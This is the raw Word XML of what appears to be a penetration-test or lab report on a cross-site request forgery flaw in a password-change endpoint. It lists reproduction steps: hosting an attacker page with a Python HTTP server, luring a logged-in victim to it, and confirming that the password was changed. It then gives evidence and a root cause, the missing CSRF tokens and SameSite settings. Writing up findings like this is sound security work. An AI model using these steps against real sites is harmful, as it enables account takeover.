    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve">4. Hosted the page via a simple Python HTTP server: `python3 -m </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>http.server</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 8000` in the attacker site directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>5. While Victim remained logged in, navigated Victim browser to `http://&lt;attacker-ip&gt;:8000/csrf_attack.html`.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>6. The form auto-submitted and the application accepted the request; the victim password was changed. Confirmed by logging in with the new password.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Evidence :</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>Captured request shows a POST to `/attack/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>csrf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>changePassword</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>` with `password` and `confirm` fields and no anti-CSRF token.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve"> Attacker-side HTML (above) demonstrates the precise forged request used.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>Verification performed by successfully authenticating with the new password after attack execution.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t xml:space="preserve"> 5. Root cause</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46">
      <w:r>
        <w:t>The server performs a state-changing operation (password change) based solely on an authenticated session cookie and form parameters, without requiring a server-validated anti-CSRF token or sufficient origin verification. The absence of per-request or per-session CSRF tokens and lack of `</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>` cookie restrictions allow an attacker to forge a valid POST using a victim’s session.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002F0E46" w:rsidRDefault="002F0E46" w:rsidP="002F0E46"/>
    <w:p w:rsidR="005A5ACA" w:rsidRDefault="005A5ACA" w:rsidP="002F0E46"/>
    <w:sectPr w:rsidR="005A5A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8224A2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="092C35BE"/>
    <w:lvl w:ilvl="0" w:tplc="538453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81386"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="778A8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4805AB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1DBC1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509AD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="10F4B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2A40CDA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43C27"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DB640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D45ED"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D236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D2707"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="072C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30D46"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BE02C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F1DE9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F95A8278"/>
    <w:lvl w:ilvl="0" w:tplc="81484060">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="435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>
    <w:nsid w:val="779D1EA2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1514E872"/>
    <w:lvl w:ilvl="0" w:tplc="2C40DF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9"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="13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B47730"/>
    <w:rsid w:val="00011CD1"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="00107082"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00177A43"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002A5AA1"/>
    <w:rsid w:val="002F0E46"/>
    <w:rsid w:val="003213E8"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="005665E0"/>
    <w:rsid w:val="005A5ACA"/>
    <w:rsid w:val="005B152D"/>
    <w:rsid w:val="00A91ACA"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B16A83"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BE49A4"/>
    <w:rsid w:val="00C137BA"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E36717"/>
    <w:rsid w:val="00E82D3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2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JANU</cp:lastModifiedBy>
  <cp:revision>11</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-29T11:35:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>